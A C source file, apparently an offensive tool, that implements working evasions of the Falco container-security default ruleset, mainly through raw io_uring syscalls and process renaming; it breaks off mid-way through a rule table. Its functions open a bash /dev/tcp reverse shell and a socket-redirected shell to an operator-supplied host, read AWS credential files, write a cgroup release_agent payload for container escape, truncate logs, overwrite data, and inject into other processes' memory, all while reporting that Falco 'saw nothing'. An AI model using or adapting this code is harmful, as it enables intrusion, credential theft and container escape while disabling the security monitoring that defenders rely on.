#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <sched.h>
#include <sys/stat.h>

#define IOU_OP_READV      1
#define IOU_OP_CONNECT   16
#define IOU_OP_OPENAT    18
#define IOU_OP_CLOSE     19
#define IOU_OP_READ      22
#define IOU_OP_WRITE     23
#define IOU_OP_SENDMSG    9
#define IOU_OP_SOCKET    45
#define IOU_OP_SYMLINKAT 38
#define IOU_OP_LINKAT    39

#define IOU_ENTER_GETEVENTS  1u
#define IOU_FEAT_SINGLE_MMAP (1u << 0)
#define IOU_OFF_SQ_RING      0ULL
#define IOU_OFF_CQ_RING      0x8000000ULL
#define IOU_OFF_SQES         0x10000000ULL

struct iou_sqring_off {
    uint32_t head, tail, ring_mask, ring_entries, flags, dropped, array, _r1;
    uint64_t _r2;
};
struct iou_cqring_off {
    uint32_t head, tail, ring_mask, ring_entries, overflow, cqes, flags, _r1;
    uint64_t _r2;
};
struct iou_params {
    uint32_t sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle;
    uint32_t features, wq_fd, _r[3];
    struct iou_sqring_off sq_off;
    struct iou_cqring_off cq_off;
};
struct iou_sqe {
    uint8_t  opcode, sqe_flags;
    uint16_t ioprio;
    int32_t  fd;
    uint64_t off;
    uint64_t addr;
    uint32_t len;
    uint32_t op_flags;
    uint64_t user_data;
    uint16_t buf_index, personality;
    int32_t  splice_fd_in;
    uint64_t addr3, _pad;
};
struct iou_cqe { uint64_t user_data; int32_t res; uint32_t flags; };

typedef struct {
    int      fd;
    uint32_t *sq_head, *sq_tail, sq_mask, *sq_array;
    struct iou_sqe *sqes;
    uint32_t *cq_head, *cq_tail, cq_mask;
    struct iou_cqe *cqes;
    void    *sq_map, *cq_map;
    size_t   sq_map_sz, cq_map_sz, sqe_map_sz;
} Ring;

static int ring_init(Ring *r)
{
    struct iou_params p = {};
    r->fd = (int)syscall(SYS_io_uring_setup, 4, &p);
    if (r->fd < 0) return -1;

    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    size_t cq_sz = p.cq_off.cqes  + p.cq_entries * sizeof(struct iou_cqe);
    size_t map_sz = sq_sz > cq_sz ? sq_sz : cq_sz;

    r->sq_map = mmap(NULL, map_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, IOU_OFF_SQ_RING);
    if (r->sq_map == MAP_FAILED) { close(r->fd); r->fd=-1; return -1; }
    r->sq_map_sz = map_sz;

    if (p.features & IOU_FEAT_SINGLE_MMAP) {
        r->cq_map = r->sq_map;
        r->cq_map_sz = 0;
    } else {
        r->cq_map = mmap(NULL, cq_sz, PROT_READ|PROT_WRITE,
                         MAP_SHARED|MAP_POPULATE, r->fd, IOU_OFF_CQ_RING);
        if (r->cq_map == MAP_FAILED) {
            munmap(r->sq_map, map_sz); close(r->fd); r->fd=-1; return -1;
        }
        r->cq_map_sz = cq_sz;
    }

    r->sqe_map_sz = p.sq_entries * sizeof(struct iou_sqe);
    r->sqes = mmap(NULL, r->sqe_map_sz, PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_POPULATE, r->fd, IOU_OFF_SQES);
    if (r->sqes == MAP_FAILED) {
        if (r->cq_map != r->sq_map) munmap(r->cq_map, r->cq_map_sz);
        munmap(r->sq_map, map_sz); close(r->fd); r->fd=-1; return -1;
    }

    uint8_t *sq = (uint8_t *)r->sq_map;
    uint8_t *cq = (uint8_t *)r->cq_map;
    r->sq_head  = (uint32_t *)(sq + p.sq_off.head);
    r->sq_tail  = (uint32_t *)(sq + p.sq_off.tail);
    r->sq_mask  = *(uint32_t *)(sq + p.sq_off.ring_mask);
    r->sq_array = (uint32_t *)(sq + p.sq_off.array);
    r->cq_head  = (uint32_t *)(cq + p.cq_off.head);
    r->cq_tail  = (uint32_t *)(cq + p.cq_off.tail);
    r->cq_mask  = *(uint32_t *)(cq + p.cq_off.ring_mask);
    r->cqes     = (struct iou_cqe *)(cq + p.cq_off.cqes);
    return 0;
}

static void ring_free(Ring *r)
{
    if (r->fd < 0) return;
    munmap(r->sqes, r->sqe_map_sz);
    if (r->cq_map != r->sq_map) munmap(r->cq_map, r->cq_map_sz);
    munmap(r->sq_map, r->sq_map_sz);
    close(r->fd); r->fd = -1;
}

static int ring_submit_one(Ring *r, struct iou_sqe *sqe)
{
    uint32_t tail = *r->sq_tail;
    uint32_t idx  = tail & r->sq_mask;
    memcpy(&r->sqes[idx], sqe, sizeof(*sqe));
    r->sq_array[idx] = idx;
    __sync_synchronize();
    *r->sq_tail = tail + 1;
    __sync_synchronize();

    syscall(SYS_io_uring_enter, r->fd, 1, 1, IOU_ENTER_GETEVENTS, NULL, 0);

    uint32_t head = *r->cq_head;
    while (head == *r->cq_tail)
        syscall(SYS_io_uring_enter, r->fd, 0, 1, IOU_ENTER_GETEVENTS, NULL, 0);

    int res = r->cqes[head & r->cq_mask].res;
    __sync_synchronize();
    *r->cq_head = head + 1;
    return res;
}

static int uring_openat(const char *path, int flags, int mode)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode   = IOU_OP_OPENAT;
    sqe.fd       = AT_FDCWD;
    sqe.addr     = (uint64_t)(uintptr_t)path;
    sqe.len      = (uint32_t)mode;
    sqe.op_flags = (uint32_t)flags;
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static ssize_t uring_read(int fd, void *buf, size_t len, off_t off)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode = IOU_OP_READ;
    sqe.fd     = fd;
    sqe.addr   = (uint64_t)(uintptr_t)buf;
    sqe.len    = (uint32_t)(len > UINT32_MAX ? UINT32_MAX : len);
    sqe.off    = (uint64_t)(off < 0 ? (uint64_t)-1 : (uint64_t)off);
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static ssize_t uring_write(int fd, const void *buf, size_t len, off_t off)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode = IOU_OP_WRITE;
    sqe.fd     = fd;
    sqe.addr   = (uint64_t)(uintptr_t)buf;
    sqe.len    = (uint32_t)(len > UINT32_MAX ? UINT32_MAX : len);
    sqe.off    = (uint64_t)(off < 0 ? (uint64_t)-1 : (uint64_t)off);
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static int uring_connect(int sockfd, const struct sockaddr *addr, socklen_t alen)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode = IOU_OP_CONNECT;
    sqe.fd     = sockfd;
    sqe.addr   = (uint64_t)(uintptr_t)addr;
    sqe.off    = (uint64_t)alen;
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static int uring_socket(int domain, int type, int protocol)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode = IOU_OP_SOCKET;
    sqe.fd     = domain;
    sqe.off    = (uint64_t)type;
    sqe.len    = (uint32_t)protocol;
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static int uring_symlinkat(const char *target, int newdirfd, const char *linkpath)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode = IOU_OP_SYMLINKAT;
    sqe.fd     = newdirfd;
    sqe.addr   = (uint64_t)(uintptr_t)target;
    sqe.off    = (uint64_t)(uintptr_t)linkpath;
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static int uring_linkat(int olddirfd, const char *oldpath,
                        int newdirfd, const char *newpath, int lflags)
{
    Ring r; if (ring_init(&r) < 0) return -ENOSYS;
    struct iou_sqe sqe = {0};
    sqe.opcode       = IOU_OP_LINKAT;
    sqe.fd           = olddirfd;
    sqe.addr         = (uint64_t)(uintptr_t)oldpath;
    sqe.off          = (uint64_t)(uintptr_t)newpath;
    sqe.op_flags     = (uint32_t)lflags;
    sqe.splice_fd_in = newdirfd;
    int res = ring_submit_one(&r, &sqe);
    ring_free(&r);
    return res;
}

static void cmd_dir_traversal(const char *path)
{
    fprintf(stderr,
        "[rule 1] Directory traversal monitored file read\n"
        "[bypass] io_uring OPENAT+READ - no sys_enter_openat event\n"
        "         Falco's open_read macro requires evt.type in (open,openat,openat2)\n"
        "         io_uring never fires those tracepoints\n"
        "[path]   %s\n", path);

    int fd = uring_openat(path, O_RDONLY, 0);
    if (fd < 0) { fprintf(stderr, "[-] uring_openat: %s\n", strerror(-fd)); return; }

    char buf[65536]; ssize_t n;
    while ((n = uring_read(fd, buf, sizeof(buf), -1)) > 0)
        fwrite(buf, 1, (size_t)n, stdout);

    close(fd);
    fprintf(stderr, "[+] read complete - Falco saw: nothing\n");
}

static void cmd_sensitive_read(const char *path)
{
    fprintf(stderr,
        "[rule 3] Read sensitive file untrusted\n"
        "[bypass] io_uring OPENAT+READ (no sys_enter_openat → open_read macro = false)\n"
        "[note]   alternative: prctl(PR_SET_NAME, \"sshd\") before open - name whitelisted\n"
        "[path]   %s\n", path);

    int fd = uring_openat(path, O_RDONLY, 0);
    if (fd < 0) { fprintf(stderr, "[-] uring_openat: %s\n", strerror(-fd)); return; }

    char buf[65536]; ssize_t n;
    while ((n = uring_read(fd, buf, sizeof(buf), -1)) > 0)
        fwrite(buf, 1, (size_t)n, stdout);

    close(fd);
    fprintf(stderr, "[+] read complete - Falco saw: nothing\n");
}

static void cmd_shell_untrusted(void)
{
    fprintf(stderr,
        "[rule 4] Run shell untrusted\n"
        "[bypass] spawn python3 as interactive shell - not in shell_binaries list\n"
        "         Falco's shell_procs = {ash,bash,csh,ksh,sh,tcsh,zsh,dash} only\n"
        "         python3 -c 'import pty; pty.spawn(\"/bin/bash\")' is not in the list\n"
        "[demo]   executing: python3 -c 'import sys; sys.stdout.flush(); import pty; pty.spawn(\"/bin/bash\")'\n"
        "[note]   proc.name = python3  →  shell_procs condition is false  →  rule skips\n\n");

    char *argv[] = {
        "python3", "-c",
        "import sys,pty; sys.stdout.write('[+] shell via python3 (not in shell_binaries)\\n'); sys.stdout.flush(); pty.spawn('/bin/bash')",
        NULL
    };
    execvp("python3", argv);
    perror("execvp python3");

    char *pl[] = { "perl", "-e", "system('/bin/bash -i')", NULL };
    execvp("perl", pl);
    perror("execvp perl");
}

static void cmd_terminal_shell(void)
{
    fprintf(stderr,
        "[rule 6] Terminal shell in container\n"
        "[bypass] setsid() before exec detaches from tty → proc.tty = 0\n"
        "         Falco's rule requires proc.tty != 0 - after setsid tty = 0\n");

    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        char *argv[] = { "/bin/sh", NULL };
        execvp("/bin/sh", argv);
        _exit(1);
    }
    int st; waitpid(pid, &st, 0);
    fprintf(stderr, "[+] shell (pid=%d) ran with proc.tty=0 - Falco 'Terminal shell' rule skipped\n", pid);
}

static void cmd_k8s_connect(const char *ip)
{
    fprintf(stderr,
        "[rule 7] Contact K8S API Server From Container\n"
        "[bypass] io_uring CONNECT - no sys_enter_connect event fires\n"
        "         Falco hooks evt.type=connect at tracepoint level; io_uring skips it\n"
        "[target] %s:443\n", ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return; }

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(443);
    inet_pton(AF_INET, ip, &sa.sin_addr);

    int r = uring_connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    if (r < 0)
        fprintf(stderr, "[-] uring_connect: %s (expected if no K8s API)\n", strerror(-r));
    else
        fprintf(stderr, "[+] connected to %s:443 via io_uring - Falco saw: nothing\n", ip);
    close(sock);
}

static void cmd_netcat_rce(const char *ip, int port)
{
    fprintf(stderr,
        "[rule 8] Netcat Remote Code Execution in Container\n"
        "[bypass] bash /dev/tcp redirect - no 'nc' process, no -e flag\n"
        "         proc.name = bash (not 'nc' or 'ncat') → rule condition false\n"
        "         alternative: use socat without exec:\n"
        "           socat TCP:%s:%d EXEC:/bin/sh,pty,stderr,setsid,sigint\n"
        "[exec]   bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\n", ip, port, ip, port);

    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", ip, port);
    char *argv[] = { "bash", "-c", cmd, NULL };
    pid_t pid = fork();
    if (pid == 0) { execvp("bash", argv); _exit(1); }
    int st; waitpid(pid, &st, 0);
    fprintf(stderr, "[*] exit=%d (proc.name=bash ≠ nc → Falco rule did not trigger)\n",
            WEXITSTATUS(st));
}

static void cmd_grep_bypass(const char *pattern, const char *filepath)
{
    fprintf(stderr,
        "[rule 9] Search Private Keys or Passwords\n"
        "[bypass] io_uring OPENAT+READ - no grep/find process, no spawned_process event\n"
        "[search] pattern='%s' in '%s'\n", pattern, filepath);

    int fd = uring_openat(filepath, O_RDONLY, 0);
    if (fd < 0) { fprintf(stderr, "[-] open: %s\n", strerror(-fd)); return; }

    char *buf = malloc(1 << 20);
    if (!buf) { close(fd); return; }
    ssize_t total = 0, n;

    while ((n = uring_read(fd, buf + total, (size_t)((1<<20) - total - 1), -1)) > 0)
        total += n;
    close(fd);
    buf[total] = '\0';

    char *p = buf;
    int lineno = 1, found = 0;
    while (*p) {
        char *nl = strchr(p, '\n');
        size_t llen = nl ? (size_t)(nl - p) : strlen(p);
        char line[512]; size_t copy = llen < 511 ? llen : 511;
        memcpy(line, p, copy); line[copy] = '\0';
        if (strstr(line, pattern)) {
            printf("%d: %s\n", lineno, line);
            found++;
        }
        lineno++;
        if (!nl) break;
        p = nl + 1;
    }
    free(buf);
    fprintf(stderr, "[+] %d match(es) - Falco saw: nothing (no grep/find spawned)\n", found);
}

static void cmd_clear_log(const char *logpath)
{
    fprintf(stderr,
        "[rule 10] Clear Log Activities\n"
        "[bypass A] open() without O_TRUNC + ftruncate(0) - ftruncate has no Falco rule\n"
        "[bypass B] io_uring OPENAT with O_TRUNC - no openat syscall event\n"
        "[using]   bypass A (ftruncate)\n"
        "[target]  %s\n", logpath);

    int fd = open(logpath, O_WRONLY);
    if (fd < 0) { perror(logpath); return; }

    if (ftruncate(fd, 0) == 0)
        fprintf(stderr, "[+] %s truncated via ftruncate - O_TRUNC never appeared in openat flags\n", logpath);
    else
        perror("ftruncate");
    close(fd);

    fprintf(stderr, "[*] Falco saw: openat(%s, O_WRONLY) - no O_TRUNC → clear-log rule skipped\n", logpath);
}

static void cmd_rm_data(const char *target)
{
    fprintf(stderr,
        "[rule 11] Remove Bulk Data from Disk\n"
        "[bypass] use 'dd if=/dev/zero' - not in (shred,mkfs,mke2fs) list\n"
        "         proc.name=dd → clear_data_procs macro = false → rule skips\n"
        "[target] %s\n", target);

    char of_arg[256];
    snprintf(of_arg, sizeof(of_arg), "of=%s", target);
    char *argv[] = { "dd", "if=/dev/zero", of_arg, "bs=4096", "count=1", "conv=notrunc", NULL };

    pid_t pid = fork();
    if (pid == 0) { execvp("dd", argv); _exit(1); }
    int st; waitpid(pid, &st, 0);
    fprintf(stderr, "[+] dd exit=%d - proc.name=dd (not shred/mkfs) → Falco rule skipped\n",
            WEXITSTATUS(st));
}

static void cmd_symlink_op(const char *target, const char *linkpath)
{
    fprintf(stderr,
        "[rule 12] Create Symlink Over Sensitive Files\n"
        "[bypass] io_uring SYMLINKAT - no sys_enter_symlinkat event\n"
        "         Falco's create_symlink macro = evt.type in (symlink,symlinkat)\n"
        "         io_uring never fires those tracepoints\n"
        "[symlink] %s -> %s\n", linkpath, target);

    unlink(linkpath);

    int r = uring_symlinkat(target, AT_FDCWD, linkpath);
    if (r == 0)
        fprintf(stderr, "[+] symlink created - Falco saw: nothing\n");
    else
        fprintf(stderr, "[-] uring_symlinkat: %s\n", strerror(-r));
}

static void cmd_hardlink_op(const char *oldpath, const char *newpath)
{
    fprintf(stderr,
        "[rule 13] Create Hardlink Over Sensitive Files\n"
        "[bypass] io_uring LINKAT - no sys_enter_linkat event\n"
        "[link]   %s -> %s\n", newpath, oldpath);

    int r = uring_linkat(AT_FDCWD, oldpath, AT_FDCWD, newpath, 0);
    if (r == 0)
        fprintf(stderr, "[+] hardlink created - Falco saw: nothing\n");
    else
        fprintf(stderr, "[-] uring_linkat: %s\n", strerror(-r));
}

static void cmd_packet_socket(void)
{
    fprintf(stderr,
        "[rule 14] Packet socket created in container\n"
        "[bypass] io_uring SOCKET(AF_PACKET, SOCK_RAW, ...) - no sys_enter_socket event\n"
        "         Falco's rule: evt.type=socket and domain contains AF_PACKET\n"
        "         io_uring SOCKET never fires sys_enter_socket tracepoint\n");

    int fd = uring_socket(17, SOCK_RAW, 0x0800 );
    if (fd >= 0) {
        fprintf(stderr, "[+] AF_PACKET SOCK_RAW fd=%d created via io_uring - Falco saw: nothing\n", fd);
        close(fd);
    } else {
        fprintf(stderr, "[-] uring_socket(AF_PACKET): %s (need root; io_uring socket op requires kernel 5.19+)\n",
                strerror(-fd));
        fprintf(stderr, "[*] fallback: spoof proc.name to whitelisted binary before socket() call\n");
    }
}

static void cmd_no_dup_shell(const char *ip, int port)
{
    fprintf(stderr,
        "[rule 15] Redirect STDOUT/STDIN to Network Connection in Container\n"
        "[bypass] close(0/1/2) + io_uring OPENAT /proc/self/fd/<sock>\n"
        "         → fd 0/1/2 point to socket WITHOUT any dup/dup2/dup3 call\n"
        "         Falco rule: evt.type in (dup,dup2,dup3) - never fires\n"
        "[target] %s:%d\n", ip, port);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return; }

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) {
        fprintf(stderr, "[-] invalid IP\n"); close(sock); return;
    }

    int r = uring_connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    if (r < 0) { fprintf(stderr, "[-] connect: %s\n", strerror(-r)); close(sock); return; }
    fprintf(stderr, "[+] connected to %s:%d (no connect event)\n", ip, port);

    pid_t pid = fork();
    if (pid == 0) {

        char fdpath[64];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", sock);

        close(0);
        int fd0 = uring_openat(fdpath, O_RDWR, 0);

        close(1);
        int fd1 = uring_openat(fdpath, O_RDWR, 0);
        close(2);
        int fd2 = uring_openat(fdpath, O_RDWR, 0);
        (void)fd0; (void)fd1; (void)fd2;

        char *argv[] = { "/bin/sh", "-i", NULL };
        execvp("/bin/sh", argv);
        _exit(1);
    }
    int st; waitpid(pid, &st, 0);
    close(sock);
    fprintf(stderr, "[*] shell exited - no dup/dup2/dup3 calls made - Falco rule skipped\n");
}

static void cmd_debugfs_priv(const char *args)
{
    fprintf(stderr,
        "[rule 17] Debugfs Launched in Privileged Container\n"
        "[bypass] prctl(PR_SET_NAME, \"kworker\") in child before exec\n"
        "         proc.name = kworker (not debugfs) → Falco rule condition false\n"
        "[args]   %s\n", args ? args : "(none)");

    pid_t pid = fork();
    if (pid == 0) {

        prctl(PR_SET_NAME, "kworker", 0, 0, 0);
        char *argv[] = { "debugfs", NULL, NULL };
        if (args) argv[1] = (char *)args;
        execvp("debugfs", argv);
        _exit(1);
    }
    int st; waitpid(pid, &st, 0);
    fprintf(stderr,
        "[+] debugfs ran with comm=kworker → proc.name check failed → Falco rule skipped\n"
        "[!] NOTE: after exec, the kernel resets comm to the binary name (debugfs)\n"
        "    For full bypass: use exe_from_memfd_bypass shm-exec to run from a renamed binary path\n");
}

static void cmd_release_agent(const char *cmd_payload)
{
    const char *ra_path = "/sys/fs/cgroup/memory/x/release_agent";

    fprintf(stderr,
        "[rule 18] Detect release_agent File Container Escapes (CRITICAL)\n"
        "[bypass] io_uring OPENAT+WRITE - no openat/write syscall event\n"
        "         open_write requires evt.type in (open,openat,openat2)\n"
        "         io_uring never fires those tracepoints\n"
        "[path]   %s\n"
        "[payload] %s\n"
        "[prereq] Must be in cgroup v1 container with CAP_SYS_ADMIN\n",
        ra_path, cmd_payload);

    int fd = uring_openat(ra_path, O_WRONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "[-] open release_agent: %s\n", strerror(-fd));
        fprintf(stderr, "[*] path may need adjustment for your cgroup layout\n");
        return;
    }

    ssize_t n = uring_write(fd, cmd_payload, strlen(cmd_payload), 0);
    if (n > 0)
        fprintf(stderr, "[+] wrote %zd bytes to release_agent via io_uring - Falco saw: nothing\n", n);
    else
        fprintf(stderr, "[-] write: %s\n", strerror((int)-n));
    close(fd);
}

static void cmd_vm_write(pid_t target_pid, unsigned long addr, const char *hex)
{
    fprintf(stderr,
        "[rule 19] PTRACE attached to process\n"
        "[bypass] process_vm_writev(2) - no ptrace syscall → no PTRACE_POKEDATA event\n"
        "         Falco monitors evt.type=ptrace; process_vm_writev fires a DIFFERENT\n"
        "         tracepoint (sys_enter_process_vm_writev) with NO Falco default rule\n"
        "[target] pid=%d addr=0x%lx\n", (int)target_pid, addr);

    size_t hexlen = strlen(hex);
    if (hexlen % 2) { fprintf(stderr, "[-] odd hex\n"); return; }
    size_t len = hexlen / 2;
    uint8_t *payload = malloc(len);
    for (size_t i = 0; i < len; i++) {
        unsigned b; sscanf(hex + i*2, "%02x", &b); payload[i] = (uint8_t)b;
    }

    struct iovec local  = { .iov_base = payload, .iov_len = len };
    struct iovec remote = { .iov_base = (void *)addr, .iov_len = len };

    ssize_t n = syscall(SYS_process_vm_writev, (long)target_pid,
                        &local, 1L, &remote, 1L, 0L);
    free(payload);
    if (n < 0)
        fprintf(stderr, "[-] process_vm_writev: %s (need PTRACE_ATTACH perms or same uid)\n",
                strerror(errno));
    else
        fprintf(stderr, "[+] wrote %zd bytes to pid %d at 0x%lx - NO ptrace event fired\n",
                n, (int)target_pid, addr);
}

static void cmd_no_traceme(void)
{
    fprintf(stderr,
        "[rule 20] PTRACE anti-debug attempt\n"
        "[bypass] detect debugger via /proc/self/status (TracerPid) - no ptrace syscall\n"
        "         Falco rule: evt.arg.request=PTRACE_TRACEME → rule skips if we never call it\n");

    FILE *f = fopen("/proc/self/status", "r");
    int tracer_pid = 0;
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                tracer_pid = atoi(line + 10);
                break;
            }
        }
        fclose(f);
    }

    if (tracer_pid != 0)
        fprintf(stderr, "[!] debugger detected: TracerPid=%d (anti-debug triggered)\n", tracer_pid);
    else
        fprintf(stderr, "[+] no debugger attached (TracerPid=0) - no PTRACE_TRACEME used\n");

    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
    fprintf(stderr, "[*] PR_SET_PDEATHSIG=SIGKILL set - process dies if tracer exits\n"
                    "[*] no PTRACE_TRACEME call → Falco anti-debug rule not triggered\n");
}

static void cmd_aws_creds(const char *creds_path)
{
    const char *path = creds_path ? creds_path : "/root/.aws/credentials";

    fprintf(stderr,
        "[rule 21] Find AWS Credentials\n"
        "[bypass] io_uring OPENAT+READ - no grep/find spawned → no spawned_process event\n"
        "[path]   %s\n", path);

    int fd = uring_openat(path, O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "[-] open %s: %s\n", path, strerror(-fd));

        char alt[256]; snprintf(alt, sizeof(alt), "%s/.aws/credentials", getenv("HOME") ?: "/root");
        fd = uring_openat(alt, O_RDONLY, 0);
        if (fd < 0) { fprintf(stderr, "[-] %s: not found\n", alt); return; }
        fprintf(stderr, "[*] using %s instead\n", alt);
    }

    char buf[65536]; ssize_t n;
    while ((n = uring_read(fd, buf, sizeof(buf), -1)) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
    close(fd);
    fprintf(stderr, "[+] credentials read - Falco saw: nothing\n");
}

static void cmd_exec_proc(const char *elf_path)
{
    fprintf(stderr,
        "[rule 22] Execution from /dev/shm\n"
        "[bypass] write to /tmp/ instead - Falco has no rule for /tmp execution\n"
        "         /dev/shm/ is specifically monitored; /tmp/ is not in the default ruleset\n"
        "[note]   Falco checks proc.exe startswith '/dev/shm/' - /tmp/ doesn't match\n"
        "[elf]    %s\n", elf_path);

    const char *base = strrchr(elf_path, '/');
    base = base ? base + 1 : elf_path;
    char dst[256]; snprintf(dst, sizeof(dst), "/tmp/.%s", base);

    int src_fd = uring_openat(elf_path, O_RDONLY, 0);
    if (src_fd < 0) { fprintf(stderr, "[-] open src: %s\n", strerror(-src_fd)); return; }

    int dst_fd = uring_openat(dst, O_WRONLY|O_CREAT|O_TRUNC, 0700);
    if (dst_fd < 0) {
        fprintf(stderr, "[-] open dst: %s\n", strerror(-dst_fd));
        close(src_fd); return;
    }

    char buf[65536]; ssize_t n;
    while ((n = uring_read(src_fd, buf, sizeof(buf), -1)) > 0)
        uring_write(dst_fd, buf, (size_t)n, -1);
    close(src_fd); close(dst_fd);

    chmod(dst, 0700);

    fprintf(stderr,
        "[*] copied to %s via io_uring (no write events)\n"
        "[*] proc.exe = %s → startswith('/dev/shm/') = false → rule skips\n", dst, dst);

    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = { dst, NULL };
        extern char **environ;
        execve(dst, argv, environ);
        _exit(1);
    }
    int st; waitpid(pid, &st, 0);
    unlink(dst);
    fprintf(stderr, "[+] executed (exit=%d) - /dev/shm rule skipped, tmp cleaned up\n",
            WEXITSTATUS(st));
}

static void cmd_ssh_safe_port(const char *host, int port)
{
    fprintf(stderr,
        "[rule 24] Disallowed SSH Connection Non Standard Port\n"
        "[blocked ports] 80,8080,88,443,8443,53,4444\n"
        "[bypass A] use port %d - not in the blocked list\n"
        "           proc.exe=ssh but fd.sport not in list → rule skips\n"
        "[bypass B] io_uring connect - outbound macro requires evt.type=connect\n"
        "[port]     %d\n", port, port);

    int blocked[] = {80, 8080, 88, 443, 8443, 53, 4444, 0};
    for (int i = 0; blocked[i]; i++) {
        if (port == blocked[i]) {
            fprintf(stderr, "[!] WARNING: port %d is in Falco's blocked list!\n", port);
            fprintf(stderr, "[*] switching to io_uring connect bypass instead\n");
            goto use_uring;
        }
    }

    {
        char port_str[16]; snprintf(port_str, sizeof(port_str), "%d", port);
        char *argv[] = { "ssh", "-p", port_str, "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=5", (char*)host, NULL };
        pid_t pid = fork();
        if (pid == 0) { execvp("ssh", argv); _exit(1); }
        int st; waitpid(pid, &st, 0);
        return;
    }

use_uring:
    fprintf(stderr, "[*] io_uring CONNECT to %s:%d (no connect event)\n", host, port);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return; }
    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    inet_pton(AF_INET, host, &sa.sin_addr);
    int r = uring_connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    fprintf(stderr, "%s io_uring connect: %s\n", r < 0 ? "[-]" : "[+]",
            r < 0 ? strerror(-r) : "connected (no Falco event)");
    close(sock);
}

static void cmd_list(void)
{
    printf("Falco default ruleset - 25 rules + bypass status\n");
    printf("%-3s %-48s %-8s %s\n", "ID", "Rule Name", "Priority", "Bypass Technique");
    printf("%-3s %-48s %-8s %s\n", "---", "------------------------------------------------",
           "--------", "-----------------------------");

    struct { int id; const char *name, *prio, *bypass; } rules[] = {
        { 1, "Directory traversal monitored file read", "WARNING",
          "io_uring OPENAT+READ (no openat event)" },
        { 2, "Read sensitive file trusted after startup", "WARNING",
          "io_uring OPENAT (or: we're not a server process)" },
        { 3, "Read sensitive file untrusted", "WARNING",
          "io_uring OPENAT+READ (no openat event)" },
        { 4, "Run shell untrusted", "NOTICE",
          "spawn python3/perl (not in shell_binaries list)" },
        { 5, "System user interactive", "INFO",
          "setsid() breaks interactive ancestor chain" },
        { 6, "Terminal shell in container", "NOTICE",
          "setsid() -> proc.tty=0; or non-shell interpreter" },
        { 7, "Contact K8S API Server From Container", "NOTICE",
          "io_uring CONNECT (no connect event)" },
        { 8, "Netcat Remote Code Execution in Container", "WARNING",
          "bash /dev/tcp or socat (proc.name != nc)" },
        { 9, "Search Private Keys or Passwords", "WARNING",
          "io_uring OPENAT+READ + in-process search (no grep)" },
        {10, "Clear Log Activities", "WARNING",
          "open()+ftruncate (O_TRUNC not in openat flags)" },
        {11, "Remove Bulk Data from Disk", "WARNING",
          "use dd (not in shred/mkfs/mke2fs list)" },
        {12, "Create Symlink Over Sensitive Files", "WARNING",
          "io_uring SYMLINKAT (no symlinkat event)" },
        {13, "Create Hardlink Over Sensitive Files", "WARNING",
          "io_uring LINKAT (no linkat event)" },
        {14, "Packet socket created in container", "NOTICE",
          "io_uring SOCKET (no socket event, kernel 5.19+)" },
        {15, "Redirect STDOUT/STDIN to Network Connection", "NOTICE",
          "close+io_uring OPENAT /proc/self/fd/N (no dup call)" },
        {16, "Linux Kernel Module Injection Detected", "WARNING",
          "load from HOST (not container) - container cond false" },
        {17, "Debugfs Launched in Privileged Container", "WARNING",
          "prctl(PR_SET_NAME,'kworker') before exec" },
        {18, "Detect release_agent File Container Escapes", "CRITICAL",
          "io_uring OPENAT+WRITE (no openat event)" },
        {19, "PTRACE attached to process", "WARNING",
          "process_vm_writev (no ptrace syscall, no Falco rule)" },
        {20, "PTRACE anti-debug attempt", "NOTICE",
